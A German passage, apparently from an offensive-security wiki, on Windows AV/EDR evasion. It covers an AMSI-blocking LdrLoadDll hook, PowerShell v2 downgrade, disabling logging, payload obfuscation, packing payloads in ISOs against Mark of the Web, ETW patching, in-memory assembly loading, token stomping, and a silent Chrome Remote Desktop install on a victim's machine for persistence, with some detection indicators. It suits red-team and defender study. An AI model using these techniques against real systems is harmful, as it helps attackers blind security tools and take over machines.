Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert gleichermaßen mit PowerShell, WScript/CScript und benutzerdefinierten Loadern (alle, die andernfalls AMSI laden würden).
- Kombiniere dies mit dem Übergeben von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Artefakte in der Befehlszeile zu vermeiden.
- Wurde bei Loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls Skripte zum Umgehen von AMSI.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls Skripte zum Umgehen von AMSI, die Signaturen durch zufällige benutzerdefinierte Funktionen, Variablen und Zeichenausdrücke vermeiden und die Groß-/Kleinschreibung von PowerShell-Schlüsselwörtern zufällig variieren, um Signaturen zu vermeiden.

**Die erkannte Signatur entfernen**

Du kannst Tools wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool scannt den Speicher des aktuellen Prozesses nach der AMSI-Signatur und überschreibt sie anschließend mit NOP-Anweisungen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV-/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV-/EDR-Produkten, die AMSI verwenden, findest du unter **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne dass sie von AMSI gescannt werden. Das geht so:

```bash
powershell.exe -version 2
```

## PowerShell-Logging

PowerShell-Logging ist eine Funktion, mit der alle auf einem System ausgeführten PowerShell-Befehle protokolliert werden können. Das kann für Audits und die Fehlersuche nützlich sein, aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um PowerShell-Logging zu umgehen, können Sie die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Zu diesem Zweck können Sie ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **PowerShell Version 2 verwenden**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne dass sie von AMSI gescannt werden. So geht's: `powershell.exe -version 2`
- **Eine nicht verwaltete PowerShell-Sitzung verwenden**: Verwenden Sie [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um PowerShell zu hosten, ohne `powershell.exe` zu starten (der von Cobalt Strikes `powerpick` verwendete Ansatz). Dadurch werden Kontrollen umgangen, die speziell an den Prozess `powershell.exe` gebunden sind. AMSI, Script Block Logging oder andere PowerShell-Schutzmaßnahmen werden dadurch jedoch nicht automatisch deaktiviert; die Abdeckung hängt von der Laufzeitumgebung und der Host-Implementierung ab.


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken basieren auf der Verschlüsselung von Daten, wodurch die Entropie der Binärdatei steigt und AVs und EDRs sie leichter erkennen können. Seien Sie damit vorsichtig und verschlüsseln Sie eventuell nur bestimmte Codeabschnitte, die sensibel sind oder verborgen werden müssen.

### Deobfuscation von mit ConfuserEx geschützten .NET-Binärdateien

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzebenen, die Decompiler und Sandboxes blockieren. Der folgende Workflow stellt zuverlässig ein nahezu ursprüngliches IL wieder her, das anschließend mit Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.<sup>[[10]](#references)</sup>

1.  Anti-Tampering entfernen – ConfuserEx verschlüsselt jeden *Methodenrumpf* und entschlüsselt ihn im statischen Konstruktor des *Moduls* (`<Module>.cctor`). Außerdem wird die PE-Prüfsumme angepasst, sodass jede Änderung zum Absturz der Binärdatei führt. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu finden, die XOR-Schlüssel wiederherzustellen und eine saubere Assembly zu schreiben:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers hilfreich sein können.

2.  Wiederherstellung von Symbolen und Kontrollfluss – übergib die *bereinigte* Datei an **de4dot-cex** (einen ConfuserEx-fähigen Fork von de4dot).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – das ConfuserEx-2-Profil auswählen
     • de4dot macht control-flow flattening rückgängig, stellt die ursprünglichen Namespaces, Klassen- und Variablennamen wieder her und entschlüsselt konstante Zeichenfolgen.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch leichtgewichtige Wrapper (auch *proxy calls* genannt), um die Dekompilierung weiter zu erschweren. Entferne sie mit **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nach diesem Schritt solltest du normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Bereinigung – führe die resultierende Binärdatei unter dnSpy aus und suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um die *echte* payload zu finden. Oft speichert die Malware sie als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss wieder her, **ohne** das bösartige Sample ausführen zu müssen – nützlich bei der Arbeit auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/)-Compiler-Suite bereitzustellen, der durch [Code-Obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz für mehr Softwaresicherheit sorgen kann.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator zeigt, wie sich die Sprache `C++11/14` verwenden lässt, um zur Compile-Zeit obfuskierten Code zu generieren, ohne externe Tools zu verwenden oder den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die vom C++-Template-Metaprogrammierungs-Framework generiert werden und es Personen, die die Anwendung knacken wollen, etwas schwerer machen.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter .exe, .dll und .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphe Code-Engine für beliebige ausführbare Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein Framework für feingranulare Code-Obfuscation für von LLVM unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembler-Code-Ebene, indem es reguläre Instruktionen in ROP-Chains umwandelt und so unser natürliches Verständnis des normalen Kontrollflusses untergräbt.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in Shellcode umwandeln und anschließend laden.

### LLVM-Compiler-unterstütztes Self-Masking pro Funktion

Anstatt ein gesamtes Implantat nur während des Schlafens zu maskieren, kann ein modifiziertes LLVM-X86-Backend ausgewählte Funktionen mit XOR maskiert halten, solange sie inaktiv sind. Der Function-Peekaboo-PoC wählt demangelte Namen aus, die `REG_` enthalten, fügt positionsunabhängige Entry-/Exit-Stubs um den finalen Maschinencode ein und gibt einen gemeinsamen Maskierungs-Handler in `.text` aus; Signaturen auf Quelltextebene und die Windows-x64-Aufrufkonvention bleiben unverändert.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend-Kontrollfluss-Transformation

Die Transformation gehört hinter die Instruktionsauswahl und Optimierung, da sie **jeden ausgegebenen Return** erfassen und das genaue x86-Layout kennen muss. Ein `MachineFunctionPass` vor der Ausgabe findet die letzte `MachineInstr::isReturn()`, löscht sie, sodass der letzte Pfad in das angehängte Epilog fällt, und ersetzt frühere Returns durch `JMP_1 handler`. Compiler-generiertes Stack-/Frame-Teardown vor jedem Return muss erhalten bleiben; umgeleitet wird nur die Return-Instruktion selbst.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` und `emitFunctionBodyEnd()` geben die Stubs pro Funktion aus, während `emitEndOfAsmFile()` den Handler ausgibt. Symbole, die von mehreren Ausgabestufen gemeinsam genutzt werden, ermöglichen es einem Prolog-Branch, auf sein späteres Epilog zu verweisen. Für ein manuell ausgegebenes Near-`je` werden `0F 84` gefolgt vom vier Byte großen MC-Ausdruck `target - address_after_je` geschrieben. Aufrufe und Sprünge zum Handler können stattdessen als `MCInst`-Objekte ausgegeben werden (`CALL64pcrel32` und `JMP_1`). Ein Pass muss für eine nicht ausgewählte Funktion `false` zurückgeben, wenn er nichts geändert hat; der PoC gibt in diesem Fall fälschlicherweise `true` zurück.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadaten und Initialisierung vor dem CRT

Der PoC legt einen XOR-Schlüssel und 16-Byte-Datensätze in `.funcmeta` ab, die einen durch den Loader relocierten Funktionszeiger sowie eine Laufzeitlänge enthalten. Obwohl das C-Feld ein `uint32_t` ist, greift der Handler an Offset `+8` des Datensatzes auf ein QWORD zu und liest dabei die Länge samt Padding; die Datensätze werden um `0x10` weitergeschaltet. PE-Abschnittsnamen sind nur acht Byte lang, daher sieht die Laufzeitsuche `.funcmet`. Ein externes Patching-Tool fügt einen ausführbaren Abschnitt `.stub` hinzu, speichert die alte Entry-Point-RVA im Stub und leitet `AddressOfEntryPoint` um. Der PIC-Stub liest die Image-Base aus `gs:[0x60]` → `[PEB+0x10]`, durchläuft die PE32+-Imports, um ein bereits importiertes `VirtualProtect` aufzulösen, und wird vor dem CRT ausgeführt.<sup>[[38]](#references)[[39]](#references)</sup>

Die Initialisierung setzt einen Sentinel in `gs:[0xE8]` und ruft jede Metadatenfunktion auf. Ihr dauerhaft lesbarer Prolog speichert den Funktionsanfang in `gs:[0xF0]`, erkennt den Sentinel und überspringt den noch unverschlüsselten Funktionskörper. Das Epilog verwendet anschließend `call handler`. Nachdem der Handler 13 Register (`0x68` Byte) gespeichert hat, ist die Rücksprungadresse bei `[rsp+0x68]` das Ende der transformierten Funktion. Daher kann `end - start` in den Metadatensatz geschrieben werden. Nachdem alle Funktionskörper maskiert wurden, löscht der Stub den Sentinel und springt zu `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Bei einem normalen Aufruf ruft der Prolog denselben symmetrischen Handler auf, um den Funktionskörper zu dekodieren. Der letzte Pfad fällt in das angehängte Epilog, während jeder frühere Return direkt zum gemeinsamen Handler springt. Auch das normale Epilog verwendet `jmp handler` statt `call`. Nach dem erneuten Maskieren verbraucht das `ret` des Handlers somit die Rücksprungadresse des ursprünglichen Aufrufers und erhält das Funktionsergebnis in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskierungsprimitive und Analyseindikatoren

Der Handler findet den aktuellen Datensatz, überspringt den festen sichtbaren Prolog (in diesem Build `0x46` Byte), ändert die Berechtigungen des Rests zu `PAGE_EXECUTE_READWRITE`, führt Byte für Byte XOR mit dem niederwertigen Schlüsselbyte aus und setzt die Berechtigungen anschließend auf `PAGE_EXECUTE_READ`. Dieselbe Schleife dekodiert somit beim Eintritt und kodiert bei jedem normalen Beenden.<sup>[[38]](#references)[[39]](#references)</sup>

Zu den aussagekräftigen Indikatoren für dieses Design gehören:<sup>[[38]](#references)[[39]](#references)</sup>

- ein Entry Point innerhalb eines ausführbaren `.stub`-Abschnitts und ein `.funcmet`-Abschnitt mit einem Schlüssel sowie relocierten `.text`-Zeigern;
- Parsing von PEB, Import-Tabelle und Abschnittstabelle vor dem CRT, gefolgt von Aufrufen über jeden Metadatenzeiger;
- identische `call`/`pop`-PIC-Prologe und zahlreiche Return-Stellen, die zu einem Handler umgeleitet werden;
- Schreibzugriffe auf `gs:[0xE8]`, `gs:[0xF0]` und `gs:[0xF8]`, gefolgt von wiederholten `VirtualProtect`-Übergängen und byteweisen XOR-Schreibzugriffen auf imagegestützte ausführbare Seiten.

Dies ist eine Umgehung von Memory-Scannern, kein kryptografischer Schutz: Die gepatchte Datei enthält weiterhin den ursprünglichen Klartext-Funktionskörper, und ein Debugger kann bei `VirtualProtect` oder der XOR-Schleife anhalten und die aktive Funktion auslesen. Das Ein-Byte-XOR, die lesbaren Metadaten und die feste Grenze `0x46` machen auch eine Offline-Wiederherstellung einfach.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die TEB-Slots des PoC gelten pro Thread, die modifizierten Code-Seiten jedoch pro Prozess. Gleichzeitiger oder rekursiver Eintritt kann daher Instruktionen erneut umschalten, während ein anderer Aufruf sie gerade ausführt. Auch Exceptions und nichtlokale Exits können das erneute Maskieren umgehen. Eine robuste Implementierung muss Übergänge synchronisieren, den tatsächlich über `lpflOldProtect` zurückgegebenen Schutz wiederherstellen, fest codierte Stub-Längen vermeiden, sowohl `call`- als auch `jmp`-Pfade auf x64-Stack-Alignment prüfen und nach dem Überschreiben ausführbarer Bytes `FlushInstructionCache` aufrufen. Microsoft weist ausdrücklich darauf hin, dass der Aufrufer für die Kohärenz des Instruktions-Caches verantwortlich ist, wenn ausführbarer Code geändert wird.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Möglicherweise ist Ihnen dieser Bildschirm schon einmal begegnet, als Sie einige ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt haben.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der Endbenutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen basiert hauptsächlich auf einem reputationsbasierten Ansatz. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen und so den Endbenutzer warnen und daran hindern, die Datei auszuführen (die Datei kann jedoch weiterhin über „More Info“ -> „Run anyway“ ausgeführt werden).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird und auch die URL enthält, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Wichtig ist, dass ausführbare Dateien mit einem **vertrauenswürdigen** Signaturzertifikat **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, zu verhindern, dass Ihre Payloads den Mark of The Web erhalten, ist, sie in einem Container wie einer ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabe-Container verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mithilfe von [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsstarker Protokollierungsmechanismus in Windows, mit dem Anwendungen und Systemkomponenten **Ereignisse protokollieren** können. Sicherheitsprodukte können ihn jedoch auch verwenden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) wird, ist es auch möglich, die Funktion **`EtwEventWrite`** des Userspace-Prozesses sofort zurückkehren zu lassen, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher gepatcht, sodass sie sofort zurückkehrt und die ETW-Protokollierung für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C#-Assembly-Reflection

C#-Binaries im Speicher zu laden, ist schon seit geraumer Zeit bekannt und nach wie vor eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV erkannt zu werden.

Da das Payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen. Dafür gibt es jedoch verschiedene Methoden:

- **Fork\&Run**

Dabei wird ein neuer **Sacrificial Process gestartet**, dein bösartiger Post-Exploitation-Code in diesen neuen Prozess injiziert, der Code ausgeführt und der neue Prozess anschließend beendet. Diese Methode hat sowohl Vor- als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet: Wenn bei einer Post-Exploitation-Aktion etwas schiefgeht oder entdeckt wird, ist die **Chance deutlich größer**, dass unser **Implant überlebt.** Der Nachteil ist, dass die **Chance größer** ist, von **Behavioural Detections** erkannt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. So musst du keinen neuen Prozess erstellen, der von AV gescannt werden könnte. Der Nachteil ist jedoch, dass bei einem Fehler während der Ausführung deines Payloads die **Chance deutlich größer** ist, **deinen Beacon zu verlieren**, da er abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, lies diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und sieh dir den zugehörigen InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)).

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## NativeAOT-WebAssembly-Neuverpackung von .NET-Tools (WasmForge)

Übliche `execute-assembly`-Techniken behalten erkennbare MSIL bei und initialisieren schließlich eine CLR. **WasmForge** verändert stattdessen die Ausführungsumgebung: Es migriert ein C#-Projekt auf das experimentelle NativeAOT-LLVM-WASI-Ziel, kompiliert es vorab zu WebAssembly und bettet dieses Modul in einen Windows-PE-Host auf Basis von Wazero ein. Der resultierende Prozess benötigt weder die CLR noch den JIT oder den `dotnet`-Host des Zielsystems. Regeln, die ausschließlich auf verwalteten Assembly-Namen, dem Laden der CLR, AMSI oder .NET ETW basieren, haben daher keinen direkten Einblick mehr. Dies ist eine Evasion-/Packaging-Technik und kein Umgehen einer Berechtigungsgrenze – der Gast behält die ursprünglichen Berechtigungen des Tools und dessen beobachtbares OS-Verhalten bei.<sup>[[44]](#references)[[45]](#references)</sup>

### Ein C#-Projekt erstellen

Der empfohlene Build-Weg führt über die Docker-Umgebung des Projekts, da sie das .NET 10 SDK, den NativeAOT-LLVM-Workload, das WASI SDK 24.0, den Linker und die Abhängigkeiten zum Signieren enthält. Eine `.csproj`-Datei wird automatisch erkannt; der einmalige Build übernimmt Migration, Kompatibilitäts-Patching, WASM-Kompilierung, PE-Erstellung und Signierung.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

For die Fehlersuche oder Überprüfung des generierten Codes, teile den Prozess in `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` und abschließend `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` auf. Das Build-Image verwendet außerdem einen `wasm-component-ld`-Wrapper, um die WASI-Preview-2-Komponentenkodierung zu vermeiden und das einfache Modul zu erzeugen, das die eingebettete Runtime erwartet.<sup>[[44]](#references)[[45]](#references)</sup>

### Bridging von wasm32-C# zu x64-Win32

Dies ist keine transparente Neukompilierung. NativeAOT-WASI unterstützt Windows-orientierte BCL-Funktionen nicht oder ändert deren Verhalten, und ein wasm32-Gast reserviert normalerweise vier Byte große Pointer-Slots, während x64-APIs acht Byte große Pointer zurückgeben können. WasmForge begegnet beiden Problemen mit den folgenden generierten Ebenen:<sup>[[44]](#references)</sup>

1. Ein Source-Patcher behebt semantische Unterschiede bei AOT und leitet nicht unterstützte Aufrufe für Registry, Pipes, WMI, Identität, Verzeichnisdienste, Dateiversionen, LSA und ähnliche Funktionen an `Wf*`-Helfer um.
2. Ein P/Invoke-Scanner erzeugt NativeAOT-`DirectPInvoke`-Zuordnungen, sodass `[DllImport]`-Aufrufe an verknüpfte C-Bridge-Symbole gebunden werden, anstatt die deklarierte DLL im Gast dynamisch zu laden.
3. Hostgebundene Pointer verwenden in C# den Typ `ulong` und in C `uint64_t`. Ein generischer Dispatcher leitet den Aufruf an den Win32-Handler des Hosts weiter; eine `out8_mask` kennzeichnet echte acht Byte große Ausgabeslots, deren obere Hälften erhalten bleiben müssen. Nicht markierte Ausgaben im wasm32-Format werden durch Snapshot-/Restore-Schutz gesichert, damit ein x64-Schreibvorgang die benachbarten vier Byte nicht beschädigt.
4. Spezielle Host-Bridges übernehmen Operationen, die nicht in den generischen Syscall-Dispatch passen, etwa den Zugriff auf den LSA-Ticket-Cache, Kerberos-/BCrypt-Operationen mit strukturierten Ergebnissen, TCP-KDC-Datenverkehr und LDAP-Abfragen.

Ein Wrapper für `version.dll!VerQueryValueW` übergibt beispielsweise vier Host-Adressen und setzt die Bits 2 und 3 (`0xC`), da der Wert-Pointer und die Länge acht Byte große Ausgabeslots sind. Der Wrapper selbst bleibt generisch und übergibt DLL-Namen, Exportnamen, Argumente und Maske an `wf_call_v2`; der Host übernimmt die Pointer-Übersetzung und ruft die native API auf.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Einschränkungen und Erkennungspunkte

Code mit vielen Reflection-Aufrufen, dynamisches Laden von Assemblies, beliebige native Callbacks und komplexe x64-Strukturen, die in den WASM-Speicher zurückgegeben werden, können weiterhin Patches für einzelne Tools erfordern oder ganz fehlschlagen. Generische WASI Preview 2-Sockets können ebenfalls No-op-Stubs aufrufen. Unterstützte Tools verwenden daher protokollspezifische Host-Shims. Überprüfe jeden Befehl anhand eines nativen Builds, statt von Feature-Parität auszugehen.<sup>[[44]](#references)[[45]](#references)</sup>

Diese Technik verlagert Telemetrie, statt die Payload unsichtbar zu machen. Die Erkennung kann sich auf eine PE-Datei konzentrieren, die ein WASM-Modul enthält oder materialisiert, auf ein Wazero-ähnliches Laufzeitverhalten, ungewöhnliche Host-/Guest-Speicherzuweisungen und -kopiervorgänge, generischen direkten Win32-Dispatch, Anomalien bei Signaturen und PE-Ressourcen sowie auf die daraus resultierenden API-Aufrufe und den Netzwerkverkehr. Das Ausbleiben von CLR-Load-, AMSI- oder .NET-ETW-Ereignissen sollte daher nicht als Beleg dafür gelten, dass ein Prozess harmlos ist.<sup>[[44]](#references)</sup>

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, lässt sich schädlicher Code in anderen Sprachen ausführen, indem man dem kompromittierten Computer Zugriff **auf die Interpreter-Umgebung gewährt, die auf der SMB-Freigabe des Angreifers installiert ist**.

Wenn du den Zugriff auf die Interpreter-Binaries und die Umgebung auf der SMB-Freigabe erlaubst, kannst du **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Computers ausführen.

Laut dem Repo scannt Defender weiterhin die Skripte. Durch die Verwendung von Go, Java, PHP usw. haben wir jedoch **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht verschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping manipuliert das Zugriffstoken eines Sicherheitsprodukts wie eines EDR oder AV. Werden die Berechtigungen des Tokens herabgesetzt, kann der Prozess weiterlaufen, während privilegierte Prüf- oder Abhilfemaßnahmen verhindert werden.

Um dies zu verhindern, könnte Windows **externen Prozessen** den Zugriff auf die Tokens von Sicherheitsprozessen verwehren.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, lässt sich Chrome Remote Desktop einfach auf dem PC eines Opfers installieren und anschließend dazu verwenden, die Kontrolle darüber zu übernehmen und Persistenz einzurichten:<sup>[[35]](#references)</sup>
1. Lade die Software von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um sie herunterzuladen.
2. Führe das Installationsprogramm unbemerkt auf dem Computer des Opfers aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf „Next“. Der Assistent fordert dich dann zur Autorisierung auf. Klicke auf die Schaltfläche „Authorize“, um fortzufahren.
4. Führe den angegebenen Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (der Parameter `--pin` legt die PIN fest, ohne die GUI zu verwenden).
 

